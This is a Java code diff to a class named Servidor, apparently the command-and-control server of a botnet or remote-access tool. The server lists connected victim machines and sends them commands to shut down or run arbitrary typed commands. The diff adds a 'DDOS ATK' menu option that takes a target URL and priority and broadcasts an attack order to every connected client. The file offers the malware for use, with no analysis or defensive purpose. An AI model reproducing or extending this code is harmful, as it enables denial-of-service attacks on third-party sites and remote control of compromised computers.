@@ -14,10 +14,13 @@ import java.util.Scanner;
  */
 public class Servidor extends Thread {
 
+    private static final int LOW = 1;
+    private static final int MEDIUM = 2;
+    private static final int HIGH = 3;
+
     private static ArrayList<BufferedWriter> clients;
     private static HashMap<BufferedWriter, String> clientsNames;
-    private static Scanner reader;
-    private String name;
+    private static String name;
     private Socket con;
     private BufferedReader bfr;
 
@@ -32,62 +35,10 @@ public class Servidor extends Thread {
         }
     }
 
-    /**
-     * Método run
-     */
-    public void run() {
-        try {
-            OutputStream outPutStream = this.con.getOutputStream();
-            Writer writer = new OutputStreamWriter(outPutStream);
-            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
-            clients.add(bufferedWriter);
-            name = bfr.readLine();
-            clientsNames.put(bufferedWriter, name);
-            //System.out.println("Client connected: " + name);
-
-
-            if (SystemTray.isSupported()) {
-                new TrayIconDemo().displayTray("Conectado", name + " conectado :D");
-            } else {
-                System.err.println("System tray not supported!");
-            }
-
-            if (clients.size() <= 1) showOptions();
-            final BufferedReader gambi = bfr;
-
-            new Thread(() -> {
-                while (true) {
-                    try {
-                        String msgg = gambi.readLine();
-                        if (msgg == null) {
-                            //System.out.println("User disconnected: " + clientsNames.get(bufferedWriter));
-                            clientsNames.remove(bufferedWriter);
-                            clients.remove(bufferedWriter);
-                            break;
-                        }
-                    } catch (IOException e) {
-                        //System.out.println("User disconnected: " + clientsNames.get(bufferedWriter));
-                        clientsNames.remove(bufferedWriter);
-                        clients.remove(bufferedWriter);
-                        break;
-                    }
-                }
-            }).start();
-
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void sendToAll(BufferedWriter bwSaida, String msg) throws IOException {
-        BufferedWriter bws;
-
+    private static void sendToAll(String msg) throws IOException {
         for (BufferedWriter bw : clients) {
-            bws = bw;
-            if (!(bwSaida == bws)) {
-                bw.write(name + " -> " + msg + "\r\n");
-                bw.flush();
-            }
+            bw.write(msg + "\r\n");
+            bw.flush();
         }
     }
 
@@ -145,25 +96,62 @@ public class Servidor extends Thread {
             System.out.println("-----------------------------------------");
 
             if (clients.size() > 0) {
-                reader = new Scanner(System.in);
+                Scanner reader = new Scanner(System.in);
                 do {
                     for (int i = 0; i < clients.size(); i++) {
                         System.out.println("(" + i + ") -> ClientName: " + clientsNames.get(clients.get(i)));
                     }
 
+                    System.out.println("(999) -> DDOS ATK");
                     System.out.println("(666) -> Update List");
                     System.out.println("-----------------------------------------");
 
                     do {
                         System.out.print("Select a client: >. ");
                         clientSelected = reader.nextInt();
-                        if ((clientSelected > clients.size() - 1 || clientSelected < 0) && clientSelected != 666) {
+                        if ((clientSelected > clients.size() - 1 || clientSelected < 0) && clientSelected != 666 && clientSelected != 999) {
                             System.out.println("Select a valid client");
                             System.out.println("-----------------------------------------");
                         }
-                    } while ((clientSelected > clients.size() - 1 || clientSelected < 0) && clientSelected != 666);
+                    }
+                    while ((clientSelected > clients.size() - 1 || clientSelected < 0) && clientSelected != 666 && clientSelected != 999);
 
-                    if(clientSelected == 666) continue;
+                    if (clientSelected == 666) {
+                        System.out.println("-----------------------------------------");
+                        continue;
+                    }
+
+                    if (clientSelected == 999) {
+                        System.out.println("ENTRY THE TARGET URL: ");
+                        reader.nextLine();
+                        String urlTarget = reader.nextLine();
+
+                        System.out.println("PRIORITY OF THE ATTACK: ");
+                        System.out.println("3 - HIGH");
+                        System.out.println("2 - MEDIUM");
+                        System.out.println("1 - LOW");
+
+                        int priority = reader.nextInt();
+
+                        switch (priority) {
+                            case HIGH:
+                                priority = HIGH;
+                                break;
+                            case MEDIUM:
+                                priority = MEDIUM;
+                            case LOW:
+                                priority = LOW;
+                            default:
+                                priority = HIGH;
+                        }
+
+                        if (!urlTarget.contains("http") || !urlTarget.contains("https")) {
+                            urlTarget = "http://" + urlTarget;
+                        }
+                        String msg = "66&" + urlTarget + "&" + priority;
+                        sendToAll(msg);
+                        continue;
+                    }
 
                     do {
                         System.out.println("0 - TURN OFF COMPUTER");
@@ -180,7 +168,10 @@ public class Servidor extends Thread {
 
                     } while (optionSelected > 3 || optionSelected < 0);
 
-                    if (optionSelected == 3) continue;
+                    if (optionSelected == 3) {
+                        System.out.println("-----------------------------------------");
+                        continue;
+                    }
 
                     String msg = "";
                     if (optionSelected == 0) {
@@ -196,8 +187,11 @@ public class Servidor extends Thread {
 
                     } else if (optionSelected == 2) {
                         System.out.println("DIGITE O COMANDO: ");
-                        String command = reader.next();
+                        reader.nextLine();
+                        String command = reader.nextLine();
                         msg = "2&" + (command == null ? "" : command);
+                    } else {
+                        continue;
                     }
 
                     try {
@@ -215,6 +209,53 @@ public class Servidor extends Thread {
                 System.out.println("-----------------------------------------");
             }
         } catch (Exception ignored) {
+        }
+    }
+
+    /**
+     * Método run
+     */
+    public void run() {
+        try {
+            OutputStream outPutStream = this.con.getOutputStream();
+            Writer writer = new OutputStreamWriter(outPutStream);
+            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
+            clients.add(bufferedWriter);
+            name = bfr.readLine();
+            clientsNames.put(bufferedWriter, name);
+            //System.out.println("Client connected: " + name);
+
+
+            if (SystemTray.isSupported()) {
+                new TrayIconDemo().displayTray("Conectado", name + " conectado :D");
+            } else {
+                System.err.println("System tray not supported!");
+            }
+
+            if (clients.size() <= 1) showOptions();
+            final BufferedReader gambi = bfr;
+
+            new Thread(() -> {
+                while (true) {
+                    try {
+                        String msgg = gambi.readLine();
+                        if (msgg == null) {
+                            //System.out.println("User disconnected: " + clientsNames.get(bufferedWriter));
+                            clientsNames.remove(bufferedWriter);
+                            clients.remove(bufferedWriter);
+                            break;
+                        }
+                    } catch (IOException e) {
+                        //System.out.println("User disconnected: " + clientsNames.get(bufferedWriter));
+                        clientsNames.remove(bufferedWriter);
+                        clients.remove(bufferedWriter);
+                        break;
+                    }
+                }
+            }).start();
+
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 }
